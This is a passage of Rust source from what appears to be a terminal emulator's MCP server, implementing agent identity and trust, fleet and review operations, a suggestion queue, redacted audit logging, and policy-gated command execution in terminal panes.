                    .collect()
            })
            .unwrap_or_default();

        let now = chrono::Local::now().to_rfc3339();
        let identity = AgentIdentity {
            name: name.to_string(),
            version: version.clone(),
            capabilities: capabilities.clone(),
            peer_addr: ctx.peer_addr.clone(),
            identified_at: now.clone(),
        };

        let first_time = {
            let mut state = mcp_state().lock();
            state
                .agents_by_connection
                .insert(ctx.conn_id, identity.clone());
            // `entry().or_insert` so the timestamp records *first ever*
            // sighting, not the latest.
            let entry = state.known_agents.entry(name.to_string());
            let is_new = matches!(entry, std::collections::hash_map::Entry::Vacant(_));
            entry.or_insert_with(|| now.clone());
            is_new
        };

        // Audit the identification itself — useful for forensics
        // ("when did claude-code first connect?").
        self.audit(
            "agent.identify",
            None,
            &format!(
                "name={} version={} first_time={}",
                name,
                version.as_deref().unwrap_or("-"),
                first_time
            ),
        );

        Ok(json!({
            "status": "ok",
            "name": name,
            "first_time": first_time,
            "identified_at": now,
        }))
    }

    /// Echo back the connection's current identity (or "anonymous" if
    /// `agent.identify` was never called).
    fn agent_whoami(&self, ctx: &ConnectionContext) -> Result<Value> {
        let state = mcp_state().lock();
        let client_role = state
            .clients_by_connection
            .get(&ctx.conn_id)
            .map(|client| client.process_role);
        match state.agents_by_connection.get(&ctx.conn_id) {
            Some(identity) => {
                let mut value = serde_json::to_value(identity)?;
                if let Some(role) = client_role {
                    value["client_role"] = json!(role);
                }
                Ok(value)
            }
            None => Ok(json!({
                "name": "anonymous",
                "peer_addr": ctx.peer_addr,
                "client_role": client_role,
            })),
        }
    }

    /// `agent.trust` — programmatically promote an agent to the
    /// persistent trust list. Equivalent to the user pressing Alt+A
    /// on a confirmation banner. Intended for the Web Settings UI
    /// (where the click happens server-side via HTTP) more than for
    /// random agents trusting themselves — but we don't ACL-gate it
    /// here because the MCP token is already an auth boundary;
    /// anyone with the token can write to a pane anyway, so trust
    /// management isn't a stronger capability.
    fn agent_trust(&self, params: &Value) -> Result<Value> {
        // The documented parameter is `agent` (and it's what the CLI
        // sends); `name` is kept for callers of the original shape.
        let name = params
            .get("agent")
            .or_else(|| params.get("name"))
            .and_then(|v| v.as_str())
            .filter(|s| !s.is_empty())
            .ok_or_else(|| anyhow!("Missing or empty 'agent'"))?;
        let added = grant_trust(name);
        Ok(json!({ "ok": true, "name": name, "added": added }))
    }

    /// `agent.untrust` — remove an agent from the persistent trust
    /// list. Subsequent writes from that agent will trigger the
    /// confirmation banner again. Does NOT touch the static lua
    /// `mcp_trusted_agents` config (the user has to edit the file
    /// for that — surfaced in the Web Settings panel UI).
    fn agent_untrust(&self, params: &Value) -> Result<Value> {
        let name = params
            .get("agent")
            .or_else(|| params.get("name"))
            .and_then(|v| v.as_str())
            .filter(|s| !s.is_empty())
            .ok_or_else(|| anyhow!("Missing or empty 'agent'"))?;
        let was = revoke_trust(name);
        Ok(json!({ "ok": true, "name": name, "removed": was }))
    }

    // --- Cockpit: agent state per pane ---

    fn cockpit_status_json(s: &unterm_services::cockpit::PaneAgentStatus) -> Value {
        json!({
            "pane_id": s.pane_id,
            "agent": s.agent,
            "state": s.state.as_str(),
            "for_secs": s.since.elapsed().as_secs(),
            "task_hint": s.task_hint,
            "last_signal": s.last_signal,
            "fleet_id": s.fleet_id,
        })
    }

    /// `agent.status` — the cockpit's view of which agent runs in which
    /// pane and what it is doing. With `pane_id`, a single entry (or
    /// `null`); without, every tracked pane in Inbox order.
    fn cockpit_agent_status(&self, params: &Value) -> Result<Value> {
        if !unterm_services::settings::current().cockpit_enabled {
            return Ok(json!({ "enabled": false, "agents": [] }));
        }
        let explicit_pane = params.get("pane_id").or_else(|| params.get("session_id"));
        if explicit_pane.is_some() {
            let pane_id = Self::pane_id_from_params(params)? as u64;
            let status = unterm_services::cockpit::status_for_pane(pane_id)
                .map(|s| Self::cockpit_status_json(&s));
            return Ok(json!({ "enabled": true, "agent": status }));
        }
        let agents: Vec<Value> = unterm_services::cockpit::snapshot()
            .iter()
            .map(Self::cockpit_status_json)
            .collect();
        Ok(json!({ "enabled": true, "agents": agents }))
    }

    /// `agent.signal` — official hook ingestion (Claude Code hooks,
    /// Codex notify, Aider notifications-command). The strongest state
    /// signal; see cockpit::status for precedence rules.
    fn cockpit_agent_signal(&self, ctx: &ConnectionContext, params: &Value) -> Result<Value> {
        let event = params
            .get("event")
            .and_then(|v| v.as_str())
            .ok_or_else(|| anyhow!("Missing 'event' (working|waiting|done|idle)"))?;
        // Hooks pass $WEZTERM_PANE; a bare CLI call falls back to the
        // pane the user is looking at.
        let engine = self.engine();
        let pane_id = self.resolve_pane_id(
            engine.as_ref(),
            params,
            PaneResolutionOptions::ACTIVE_REQUIRED,
        )? as u64;
        let agent = params
            .get("agent")
            .and_then(|v| v.as_str())
            .map(|s| s.to_string())
            .or_else(|| {
                mcp_state()
                    .lock()
                    .agents_by_connection
                    .get(&ctx.conn_id)
                    .map(|a| a.name.clone())
            })
            .unwrap_or_else(|| "agent".to_string());
        // The official "working" hook is the strongest point at which a
        // loose agent says it is about to mutate its repository. Snapshot
        // before publishing the transition; non-repository panes are normal
        // and therefore a checkpoint failure is deliberately non-fatal.
        if event == "working" {
            if let Ok(shell) = engine.shell(pane_id as usize) {
                if let Some(cwd) = shell.cwd {
                    if let Err(err) = unterm_services::cockpit::review::record_auto_checkpoint(
                        std::path::Path::new(&cwd),
                        &agent,
                        pane_id,
                    ) {
                        log::debug!("automatic hook checkpoint skipped: {err:#}");
                    }
                }
            }
        }
        if !unterm_services::cockpit::on_hook_signal(pane_id, &agent, event) {
            anyhow::bail!("Invalid 'event' {event:?}: expected working|waiting|done|idle");
        }
        self.audit(
            "agent.signal",
            Some(&pane_id.to_string()),
            &format!("agent={agent} event={event}"),
        );
        Ok(json!({ "ok": true, "pane_id": pane_id, "agent": agent, "event": event }))
    }

    /// `cockpit.inbox` — every tracked agent joined with its tab/window
    /// location so a client can jump straight to it.
    fn cockpit_inbox(&self) -> Result<Value> {
        if !unterm_services::settings::current().cockpit_enabled {
            return Ok(json!({ "enabled": false, "items": [] }));
        }
        let engine = self.engine();
        let engine_name = engine.name();
        let sessions_by_id: HashMap<u64, _> = engine
            .list_sessions()?
            .into_iter()
            .map(|session| (session.id as u64, session))
            .collect();
        let pane_locations = engine.pane_locations().unwrap_or_default();
        let current = unterm_services::server_info::read_current();
        let current_id = current.id.clone();
        let current_title = current.title.clone().unwrap_or_else(|| current_id.clone());
        let mut items: Vec<Value> = unterm_services::cockpit::snapshot()
            .iter()
            .map(|s| {
                let mut v = Self::cockpit_status_json(s);
                v["instance_id"] = json!(current_id.clone());
                v["instance_title"] = json!(current_title.clone());
                if let Some(session) = sessions_by_id.get(&s.pane_id) {
                    v["pane_title"] = json!(session.title);
                    v["session"] = json!({
                        "id": session.id,
                        "title": session.title,
                        "engine": engine_name,
                        "is_active": session.is_active,
                        "is_dead": session.is_dead,
                        "domain_id": session.domain_id,
                        "shell": session.shell,
                    });
                }
                if let Some(location) = pane_locations.get(&s.pane_id) {
                    v["tab_id"] = json!(location.tab_id);
                    v["window_id"] = json!(location.window_id);
                }
                v
            })
            .collect();
        let now = chrono::Utc::now().timestamp_millis();
        for instance in unterm_services::server_info::list_live_instances()
            .into_iter()
            .filter(|instance| instance.id != current_id)
        {
            let instance_title = instance
                .title
                .clone()
                .unwrap_or_else(|| instance.id.clone());
            for agent in instance.agents {
                items.push(json!({
                    "pane_id": agent.pane_id,
                    "agent": agent.agent,
                    "state": agent.state,
                    "for_secs": now.saturating_sub(agent.since_unix_ms).max(0) / 1000,
                    "task_hint": agent.task_hint,
                    "last_signal": "peer-snapshot",
                    "fleet_id": null,
                    "pane_title": agent.pane_title,
                    "tab_id": agent.tab_id,
                    "window_id": agent.window_id,
                    "instance_id": instance.id.clone(),
                    "instance_title": instance_title.clone(),
                    "peer": true,
                }));
            }
        }
        items.sort_by(|a, b| {
            let rank = |value: &Value| match value["state"].as_str().unwrap_or("idle") {
                "waiting" => 0,
                "done" => 1,
                "working" => 2,
                _ => 3,
            };
            rank(a).cmp(&rank(b)).then_with(|| {
                b["for_secs"]
                    .as_i64()
                    .unwrap_or(0)
                    .cmp(&a["for_secs"].as_i64().unwrap_or(0))
            })
        });
        Ok(json!({ "enabled": true, "items": items }))
    }

    // --- Cockpit: fleet + review ---

    fn engine_fleet_driver(&self) -> EngineFleetDriver {
        EngineFleetDriver {
            engine: self.engine(),
        }
    }

    /// `fleet.launch` — one task × N agents × N git worktrees. Blocking
    /// (worktree creation + tab spawn), which is fine on the MCP thread.
    fn fleet_launch(&self, params: &Value) -> Result<Value> {
        let engine = self.engine();
        let cwd = params
            .get("cwd")
            .and_then(|v| v.as_str())
            .map(std::path::PathBuf::from)
            .or_else(|| {
                engine
                    .list_sessions()
                    .ok()
                    .and_then(|sessions| sessions.into_iter().find(|session| session.is_active))
                    .and_then(|session| session.shell.cwd.map(std::path::PathBuf::from))
            })
            .ok_or_else(|| anyhow!("Missing 'cwd' and no active pane to take it from"))?;
        let task = params
            .get("task")
            .and_then(|v| v.as_str())
            .filter(|s| !s.trim().is_empty())
            .ok_or_else(|| anyhow!("Missing 'task'"))?;
        let agents: Vec<String> = params
            .get("agents")
            .and_then(|v| v.as_array())
            .map(|arr| {
                arr.iter()
                    .filter_map(|a| a.as_str().map(|s| s.to_string()))
                    .collect()
            })
            .filter(|v: &Vec<String>| !v.is_empty())
            .ok_or_else(|| anyhow!("Missing 'agents' (e.g. [\"claude\",\"claude\"])"))?;
        let mut spawner = EngineFleetDriver { engine };
        let fleet = unterm_services::cockpit::fleet::launch_with_spawner(
            &cwd,
            task,
            &agents,
            &mut spawner,
        )?;
        self.audit(
            "fleet.launch",
            None,
            &format!("id={} members={}", fleet.id, fleet.members.len()),
        );
        Ok(serde_json::to_value(&fleet)?)
    }

    fn fleet_clean(&self, params: &Value) -> Result<Value> {
        let id = params
            .get("id")
            .or_else(|| params.get("fleet_id"))
            .and_then(|v| v.as_str())
            .ok_or_else(|| anyhow!("Missing 'id'"))?;
        let force = params
            .get("force")
            .and_then(|v| v.as_bool())
            .unwrap_or(false);
        let mut remover = self.engine_fleet_driver();
        unterm_services::cockpit::fleet::clean_with_remover(id, force, &mut remover)?;
        self.audit("fleet.clean", None, &format!("id={id} force={force}"));
        Ok(json!({ "ok": true, "id": id }))
    }

    fn fleet_retry(&self, params: &Value) -> Result<Value> {
        let fleet_id = params
            .get("fleet_id")
            .and_then(|v| v.as_str())
            .ok_or_else(|| anyhow!("Missing 'fleet_id'"))?;
        let member = params
            .get("member")
            .and_then(|v| v.as_str())
            .ok_or_else(|| anyhow!("Missing 'member'"))?;
        let mut spawner = self.engine_fleet_driver();
        let mut remover = self.engine_fleet_driver();
        let retried = unterm_services::cockpit::fleet::retry_member_with_driver(
            fleet_id,
            member,
            &mut spawner,
            &mut remover,
        )?;
        self.audit(
            "fleet.retry",
            None,
            &format!("fleet={fleet_id} member={member}"),
        );
        Ok(serde_json::to_value(retried)?)
    }

    fn review_verify(&self, params: &Value) -> Result<Value> {
        let fleet_id = params
            .get("fleet_id")
            .and_then(|v| v.as_str())
            .ok_or_else(|| anyhow!("Missing 'fleet_id'"))?;
        let member = params
            .get("member")
            .and_then(|v| v.as_str())
            .ok_or_else(|| anyhow!("Missing 'member'"))?;
        let command = params.get("command").and_then(|v| v.as_str());
        let timeout = params.get("timeout_secs").and_then(|v| v.as_u64());
        let record = unterm_services::cockpit::verification::verify_member(
            fleet_id, member, command, timeout,
        )?;
        self.audit(
            "review.verify",
            None,
            &format!(
                "fleet={fleet_id} member={member} command={}",
                record.command
            ),
        );
        Ok(serde_json::to_value(record)?)
    }

    fn review_diff(&self, params: &Value) -> Result<Value> {
        // Either (fleet_id, member) or (repo, from).
        if let Some(fleet_id) = params.get("fleet_id").and_then(|v| v.as_str()) {
            let member = params
                .get("member")
                .and_then(|v| v.as_str())
                .ok_or_else(|| anyhow!("Missing 'member'"))?;
            let fleet = unterm_services::cockpit::fleet::get(fleet_id)
                .ok_or_else(|| anyhow!("no fleet {fleet_id:?}"))?;
            let m = unterm_services::cockpit::fleet::resolve_member(&fleet, member)?;
            return unterm_services::cockpit::review::diff(&m.worktree, &m.checkpoint);
        }
        let repo = params
            .get("repo")
            .and_then(|v| v.as_str())
            .ok_or_else(|| anyhow!("Missing 'repo' (or 'fleet_id'+'member')"))?;
        let from = params
            .get("from")
            .and_then(|v| v.as_str())
            .ok_or_else(|| anyhow!("Missing 'from' (checkpoint sha)"))?;
        unterm_services::cockpit::review::diff(std::path::Path::new(repo), from)
    }

    fn review_rollback(&self, params: &Value) -> Result<Value> {
        let confirmed = params
            .get("confirm")
            .and_then(|v| v.as_bool())
            .unwrap_or(false);
        if !confirmed {
            return Err(anyhow!(
                "review.rollback is destructive; pass 'confirm': true after explicit user confirmation"
            ));
        }
        let repo = params
            .get("repo")
            .and_then(|v| v.as_str())
            .ok_or_else(|| anyhow!("Missing 'repo'"))?;
        let sha = params
            .get("sha")
            .and_then(|v| v.as_str())
            .ok_or_else(|| anyhow!("Missing 'sha'"))?;
        unterm_services::cockpit::review::rollback(std::path::Path::new(repo), sha)?;
        self.audit("review.rollback", None, &format!("repo={repo} sha={sha}"));
        Ok(json!({ "ok": true, "repo": repo, "sha": sha }))
    }

    fn review_merge(&self, params: &Value) -> Result<Value> {
        let fleet_id = params
            .get("fleet_id")
            .and_then(|v| v.as_str())
            .ok_or_else(|| anyhow!("Missing 'fleet_id'"))?;
        let member = params
            .get("member")
            .and_then(|v| v.as_str())
            .ok_or_else(|| anyhow!("Missing 'member'"))?;
        let force = params
            .get("force")
            .and_then(|v| v.as_bool())
            .unwrap_or(false);
        let out =
            unterm_services::cockpit::review::merge_member_with_policy(fleet_id, member, force)?;
        self.audit(
            "review.merge",
            None,
            &format!("fleet={fleet_id} member={member} force={force}"),
        );
        Ok(out)
    }

    fn review_discard(&self, params: &Value) -> Result<Value> {
        let fleet_id = params
            .get("fleet_id")
            .and_then(|v| v.as_str())
            .ok_or_else(|| anyhow!("Missing 'fleet_id'"))?;
        let member = params
            .get("member")
            .and_then(|v| v.as_str())
            .ok_or_else(|| anyhow!("Missing 'member'"))?;
        let out = unterm_services::cockpit::review::discard_member(fleet_id, member)?;
        self.audit(
            "review.discard",
            None,
            &format!("fleet={fleet_id} member={member}"),
        );
        Ok(out)
    }

    /// Called by the TCP server when a client connection drops so
    /// `agents_by_connection` doesn't grow unboundedly. `known_agents`
    /// is intentionally kept — it's "have we *ever* seen this name?",
    /// which outlives any single connection.
    pub fn drop_connection(&self, conn_id: u64) {
        let mut state = mcp_state().lock();
        state.agents_by_connection.remove(&conn_id);
        state.clients_by_connection.remove(&conn_id);
    }

    // --- Ghost text debug ---

    /// Read the ghost-text registry's current view of a pane.
    /// Read-only — never mutates state. Lets a remote debugger see
    /// whether the buffer is growing as the user types, whether
    /// commits are landing, and what (if anything) the predictor is
    /// proposing.
    fn ghost_debug(&self, params: &Value) -> Result<Value> {
        let pane_id = params
            .get("id")
            .or_else(|| params.get("pane_id"))
            .and_then(|v| v.as_u64())
            .ok_or_else(|| anyhow!("Missing 'id' / 'pane_id' parameter"))?;
        match unterm_services::ghost_text::debug_snapshot(pane_id) {
            Some(snap) => Ok(serde_json::to_value(snap)?),
            None => Ok(json!({"empty": true, "pane_id": pane_id})),
        }
    }

    // --- Suggest API ---

    /// Post a non-PTY-writing suggestion. The text is queued for the
    /// user to accept (Tab in the suggest UI) or dismiss (Esc); the
    /// MCP client never gets to inject keystrokes directly when it
    /// uses this method. Returns a suggestion id the caller can use
    /// for status / cancel.
    fn session_suggest(&self, ctx: &ConnectionContext, params: &Value) -> Result<Value> {
        let engine = self.engine();
        let pane_id = self.resolve_pane_id(
            engine.as_ref(),
            params,
            PaneResolutionOptions::REQUIRED_EXISTING,
        )?;
        let pane_id = pane_id as u64;

        let text = params
            .get("text")
            .and_then(|v| v.as_str())
            .ok_or_else(|| anyhow!("Missing 'text' parameter"))?;
        if text.is_empty() {
            return Err(anyhow!("'text' must be non-empty"));
        }
        if text.len() > 4096 {
            // A *suggestion* longer than 4KB is almost certainly a bug
            // — refuse it so a misbehaving agent can't OOM the queue.
            return Err(anyhow!("'text' too large ({} > 4096 bytes)", text.len()));
        }

        let rationale = params
            .get("rationale")
            .and_then(|v| v.as_str())
            .map(|s| s.to_string());
        let ttl_ms = params
            .get("ttl_ms")
            .and_then(|v| v.as_u64())
            .unwrap_or_else(|| unterm_services::settings::current().mcp_suggest_default_ttl_ms);
        let source: SuggestionSource = params
            .get("source")
            .cloned()
            .and_then(|v| serde_json::from_value(v).ok())
            .unwrap_or_default();

        let now = chrono::Local::now().to_rfc3339();
        let agent_label = current_agent_label();

        let id = {
            let mut state = mcp_state().lock();
            state.suggestion_seq = state.suggestion_seq.saturating_add(1);
            format!(
                "sg_{}_{}",
                chrono::Utc::now().timestamp_millis(),
                state.suggestion_seq
            )
        };

        let suggestion = Suggestion {
            id: id.clone(),
            pane_id,
            text: text.to_string(),
            rationale: rationale.clone(),
            source: source.clone(),
            created_at: now.clone(),
            ttl_ms,
            state: SuggestionState::Pending,
            posted_by_conn: ctx.conn_id,
            posted_by_agent: agent_label.clone(),
        };

        let suggest_max = unterm_services::settings::current()
            .mcp_suggest_queue_capacity
            .max(8);
        {
            let mut state = mcp_state().lock();
            state.suggestions.insert(id.clone(), suggestion);
            state.suggestion_order.push(id.clone());
            if state.suggestion_order.len() > suggest_max {
                let drop_n = (suggest_max / 8).max(1);
                for old_id in state.suggestion_order.drain(..drop_n).collect::<Vec<_>>() {
                    state.suggestions.remove(&old_id);
                }
            }
        }

        self.audit(
            "session.suggest",
            Some(&pane_id.to_string()),
            &format!("id={} {}", id, input_preview(text)),
        );

        Ok(json!({
            "suggestion_id": id,
            "status": "queued",
        }))
    }

    fn session_suggest_status(&self, params: &Value) -> Result<Value> {
        let id = params
            .get("suggestion_id")
            .or_else(|| params.get("id"))
            .and_then(|v| v.as_str())
            .ok_or_else(|| {
                anyhow!("Missing 'suggestion_id' (or compatibility alias 'id') parameter")
            })?;
        let state = mcp_state().lock();
        let suggestion = state
            .suggestions
            .get(id)
            .ok_or_else(|| anyhow!("Unknown suggestion_id: {}", id))?;
        Ok(json!(suggestion))
    }

    fn session_suggest_cancel(&self, params: &Value) -> Result<Value> {
        let id = params
            .get("suggestion_id")
            .or_else(|| params.get("id"))
            .and_then(|v| v.as_str())
            .ok_or_else(|| {
                anyhow!("Missing 'suggestion_id' (or compatibility alias 'id') parameter")
            })?
            .to_string();
        let mut state = mcp_state().lock();
        let suggestion = state
            .suggestions
            .get_mut(&id)
            .ok_or_else(|| anyhow!("Unknown suggestion_id: {}", id))?;
        if matches!(suggestion.state, SuggestionState::Pending) {
            suggestion.state = SuggestionState::Cancelled {
                at: chrono::Local::now().to_rfc3339(),
            };
        }
        Ok(json!({"status": "ok"}))
    }

    fn session_suggest_list(&self, params: &Value) -> Result<Value> {
        let pane_filter = params.get("pane_id").and_then(|v| v.as_u64());
        let state = mcp_state().lock();
        let mut out: Vec<&Suggestion> = state
            .suggestions
            .values()
            .filter(|s| pane_filter.map_or(true, |p| s.pane_id == p))
            .filter(|s| matches!(s.state, SuggestionState::Pending))
            .collect();
        out.sort_by(|a, b| a.created_at.cmp(&b.created_at));
        Ok(json!(out))
    }

    fn audit(&self, method: &str, session_id: Option<&str>, detail: &str) {
        AUDIT_WRITTEN_THIS_CALL.with(|cell| cell.set(true));
        // Straight to the services redaction: the wrapper only looked the
        // config up, and that is with the archive now.
        let patterns = unterm_services::recording::archive::load_config()
            .redaction
            .custom_patterns;
        let detail = unterm_services::recording::redact_sensitive_text(detail, &patterns);
        // A denied or expired confirmation is still an important audit
        // event, but it must not look like an authorized write.  Consumers
        // use this field to distinguish attempted writes from writes that
        // were actually permitted.
        let allowed = audit_event_was_allowed(method);
        let outcome = if allowed { "executed" } else { "denied" };
        let entry = AuditEntry {
            timestamp: chrono::Local::now().to_rfc3339(),
            method: method.to_string(),
            session_id: session_id.map(|s| s.to_string()),
            detail,
            allowed,
            outcome: outcome.to_string(),
            agent: current_agent_label(),
        };
        let audit_max = unterm_services::settings::current()
            .mcp_audit_log_capacity
            .max(16);
        // The line on disk is the entry that outlives the process; it goes
        // out already redacted, same bytes the ring holds. Not under test:
        // the handler tests exercise audited methods by the dozen, and their
        // noise must not land in the user's real trail.
        if !cfg!(test) {
            if let Ok(line) = serde_json::to_value(&entry) {
                unterm_services::audit_store::append(&line);
            }
        }
        let mut state = mcp_state().lock();
        state.audit_log.push(entry);
        // Cap the in-memory log so a chatty agent can't OOM us. Drop the
        // oldest 10% in one shot so we amortize the shift cost instead of
        // re-shifting every push.
        if state.audit_log.len() > audit_max {
            let drop = audit_max / 10;
            state.audit_log.drain(..drop);
        }
        // Bump the activity counter so the status bar chip can surface
        // "AI just wrote to a pane" without scanning the whole audit
        // log. Only PTY-write methods qualify — read-only methods like
        // screen.read or session.list shouldn't make the chip flash.
        if matches!(
            method,
            "session.input"
                | "session.paste"
                | "exec.send"
                | "exec.run"
                | "exec.run_wait"
                | "orchestrate.launch"
                | "orchestrate.broadcast"
        ) {
            // Attribute the pane to the writing agent for the left tab
            // bar's "agent · dir" subtitle.
            if let Some(pane_id) = session_id.and_then(|s| s.parse::<u64>().ok()) {
                let agent = entry_agent_from_last_audit(&state);
                state
                    .pane_agents
                    .insert(pane_id, (agent, std::time::Instant::now()));
            }
        }
        if matches!(
            method,
            "session.input"
                | "session.paste"
                | "exec.send"
                | "exec.run"
                | "exec.run_wait"
                | "exec.cancel"
                | "signal.send"
                | "orchestrate.launch"
                | "orchestrate.broadcast"
        ) {
            state.input_event_count = state.input_event_count.saturating_add(1);
            state.last_input_at = Some(std::time::Instant::now());
            // Stamp "first PTY write from this agent" — the soft
            // alternative to the (deferred) blocking confirmation
            // banner. A reader scanning the audit log sees a clear
            // signal when a new agent starts driving a terminal.
            let agent = entry_agent_from_last_audit(&state);
            if state.agents_with_input_history.insert(agent.clone()) {
                log::warn!(
                    "MCP: first PTY write by agent {agent:?} via {method} — review session.audit_log",
                );
                if let Some(last) = state.audit_log.last_mut() {
                    last.detail.push_str(" first_input=true");
                }
            }
        }
    }

    // --- Exec methods ---

    fn exec_run(&self, params: &Value) -> Result<Value> {
        let command = params
            .get("command")
            .and_then(|v| v.as_str())
            .ok_or_else(|| anyhow!("Missing 'command'"))?;

        if let Err(e) = self.check_policy_internal("exec.run", command) {
            return Err(e);
        }

        let engine = self.engine();
        let pane_id = self.resolve_pane_id(
            engine.as_ref(),
            params,
            PaneResolutionOptions::REQUIRED_EXISTING,
        )?;
        self.check_pane_cwd_path_scope("exec.run", params, pane_id, engine.as_ref())?;

        match self.gate_pty_write("exec.run", pane_id, command)? {
            GateOutcome::Allow => {}
            GateOutcome::Block(why) => {
                return Err(anyhow!("{why}"));
            }
        }

        self.audit("exec.run", Some(&pane_id.to_string()), command);

        let input = format!("{}\r", command);
        engine.write_input(pane_id, &input)?;
        Ok(json!({"sent": true}))
    }

    fn exec_send(&self, params: &Value) -> Result<Value> {
        let bytes = params
            .get("bytes")
            .or_else(|| params.get("input"))
            .or_else(|| params.get("text"))
            .and_then(|v| v.as_str())
            .ok_or_else(|| anyhow!("Missing 'bytes' (or compatibility alias 'input'/'text')"))?;
        let engine = self.engine();
        let pane_id = self.resolve_pane_id(
            engine.as_ref(),
            params,
            PaneResolutionOptions::REQUIRED_EXISTING,
        )?;
        self.check_pane_cwd_path_scope("exec.send", params, pane_id, engine.as_ref())?;

        match self.gate_pty_write("exec.send", pane_id, bytes)? {
            GateOutcome::Allow => {}
            GateOutcome::Block(why) => {
                return Err(anyhow!("{why}"));
            }
        }

        self.audit(
            "exec.send",
            Some(&pane_id.to_string()),
            &input_preview(bytes),
        );
        engine.write_input(pane_id, bytes)?;
        Ok(json!({"status": "ok"}))
    }

    fn exec_run_wait(&self, params: &Value) -> Result<Value> {
        let command = params
            .get("command")
            .and_then(|v| v.as_str())
            .ok_or_else(|| anyhow!("Missing 'command'"))?;
        let timeout_ms = params
            .get("timeout_ms")
            .and_then(|v| v.as_u64())
            .unwrap_or(30000);

        if let Err(e) = self.check_policy_internal("exec.run_wait", command) {
            return Err(e);
        }

        let engine = self.engine();
        let pane_id = self.resolve_pane_id(
            engine.as_ref(),
            params,
            PaneResolutionOptions::REQUIRED_EXISTING,
        )?;
        self.check_pane_cwd_path_scope("exec.run_wait", params, pane_id, engine.as_ref())?;
        let shell = engine.shell(pane_id)?;
        let activity = engine.activity(pane_id).ok();
        let wait_shell = resolve_exec_wait_shell(&shell, activity.as_ref());

        let marker = format!("__UNTERM_DONE_{}__", uuid::Uuid::new_v4().simple());
        let wait_command = wait_wrapped_command(command, wait_shell.kind.as_str(), &marker);

        match self.gate_pty_write("exec.run_wait", pane_id, command)? {
            GateOutcome::Allow => {}
            GateOutcome::Block(why) => {
                return Err(anyhow!("{why}"));
            }
        }

        self.audit("exec.run_wait", Some(&pane_id.to_string()), command);

        // Capture screen before
        let before_text = engine.read_visible_text(pane_id).unwrap_or_default();

        // Send command
        let input = format!("{}\r", wait_command);
        engine.write_input(pane_id, &input)?;

        // Poll until the injected sentinel is rendered. This gives CLI/MCP
        // automation a deterministic completion condition across shells.
        let start = std::time::Instant::now();
        let timeout = std::time::Duration::from_millis(timeout_ms);

        loop {
            std::thread::sleep(std::time::Duration::from_millis(200));

            let current_text = engine.read_visible_text(pane_id).unwrap_or_default();
            if contains_ignoring_line_breaks(&current_text, &marker) {
                std::thread::sleep(std::time::Duration::from_millis(200));
                let final_text = engine.read_visible_text(pane_id).unwrap_or_default();
                let output = extract_wait_output(&before_text, &final_text, command, &marker);
                return Ok(json!({
                    "output": output,
                    "exit_status": "completed",
                    "timed_out": false,
                    "marker": marker,
                    "shell_type": wait_shell.kind,
                    "shell_source": wait_shell.source,
                }));
            }

            if start.elapsed() > timeout {
                let current_text = engine.read_visible_text(pane_id).unwrap_or_default();
                let output = extract_wait_output(&before_text, &current_text, command, &marker);
                return Ok(json!({
                    "output": output,
                    "exit_status": "timeout",
                    "timed_out": true,
                    "marker": marker,
                    "shell_type": wait_shell.kind,
                    "shell_source": wait_shell.source,
                }));
            }
        }
    }

    fn exec_status(&self, params: &Value) -> Result<Value> {
        let engine = self.engine();
        let pane_id = self.resolve_pane_id(
            engine.as_ref(),
            params,
            PaneResolutionOptions::REQUIRED_EXISTING,
        )?;
        let activity = engine.activity(pane_id)?;
        let status = if activity.idle { "idle" } else { "running" };
        Ok(json!({
            "status": status,
            "foreground_process": activity.foreground_process,
            "process": activity.process,
            "input": activity.input,
            "output": activity.output,
            "paste": activity.paste,
        }))
    }

    fn exec_cancel(&self, params: &Value) -> Result<Value> {
        let engine = self.engine();
        let pane_id = self.resolve_pane_id(
            engine.as_ref(),
            params,
            PaneResolutionOptions::REQUIRED_EXISTING,
        )?;
        self.check_pane_cwd_path_scope("exec.cancel", params, pane_id, engine.as_ref())?;

        match self.gate_pty_write("exec.cancel", pane_id, "Ctrl+C")? {
            GateOutcome::Allow => {}
            GateOutcome::Block(why) => {
                return Err(anyhow!("{why}"));
            }
        }

        self.audit("exec.cancel", Some(&pane_id.to_string()), "Ctrl+C");
        engine.write_input(pane_id, "\x03")?;
        Ok(json!({"cancelled": true}))
    }

    // --- Signal ---

    fn signal_send(&self, params: &Value) -> Result<Value> {
        let signal = params
            .get("signal")
            .and_then(|v| v.as_str())
            .ok_or_else(|| anyhow!("Missing 'signal'"))?;
        let input = match signal.to_uppercase().as_str() {
            "SIGINT" | "INT" => "\x03",
            "SIGTSTP" | "TSTP" => "\x1a",
            "SIGQUIT" | "QUIT" => "\x1c",
            "EOF" => "\x04",
            _ => return Err(anyhow!("Unsupported signal: {}", signal)),
        };

        let engine = self.engine();
        let pane_id = self.resolve_pane_id(
            engine.as_ref(),
            params,
            PaneResolutionOptions::REQUIRED_EXISTING,
        )?;
        self.check_pane_cwd_path_scope("signal.send", params, pane_id, engine.as_ref())?;

        match self.gate_pty_write("signal.send", pane_id, signal)? {
            GateOutcome::Allow => {}
            GateOutcome::Block(why) => {
                return Err(anyhow!("{why}"));
            }
        }

        self.audit("signal.send", Some(&pane_id.to_string()), signal);
        engine.write_input(pane_id, input)?;

        // On Windows the byte alone only reaches the shell's line editor: a
        // program that is running and not reading input -- which is every
        // program worth interrupting -- never hears it. The real interrupt is
        // a console control event for that pane's process group.
        let mut delivered = json!("byte");
        if input == unterm_services::interrupt::INTERRUPT_BYTE {
            let process = engine.activity(pane_id).ok().and_then(|a| a.process);
            match process.as_ref().and_then(|p| p.root_pid) {
                Some(shell) => {
                    let foreground = process.as_ref().and_then(|p| p.foreground_pid);
                    match unterm_services::interrupt::stop_foreground(shell, foreground) {
                        Ok(outcome) => delivered = json!(format!("{outcome:?}").to_lowercase()),
                        // Said rather than swallowed: an interrupt that
                        // quietly did nothing is the thing being fixed here.
                        Err(err) => delivered = json!({ "failed": err.to_string() }),
                    }
                }
                None => delivered = json!({ "failed": "the pane has no process to interrupt" }),
            }
        }
        Ok(json!({"sent": true, "signal": signal, "delivered": delivered}))
    }

    // --- Screen extensions ---

    /// `screen.clear` — throw away a pane's history.
    ///
    /// The scrollback only, unless `include_screen` is set. An agent that has
    /// just filled a pane with a build log has no other way to get rid of it:
    /// sending `clear` to the shell is a command the user did not run and it
    /// lands in their history, and `CSI 3 J` written as input is text the
    /// shell reads rather than a sequence the terminal acts on.
    ///
    /// Params: `id` / `session_id` (optional, defaults to the active pane),
    /// `include_screen` (optional, default false).
    /// Returns: `{ ok: true, id, include_screen }`.
    fn screen_clear(&self, params: &Value) -> Result<Value> {
        let engine = self.engine();
        // The active pane when none is named, the same as every read on this
        // namespace: an agent clearing the pane it has been watching should
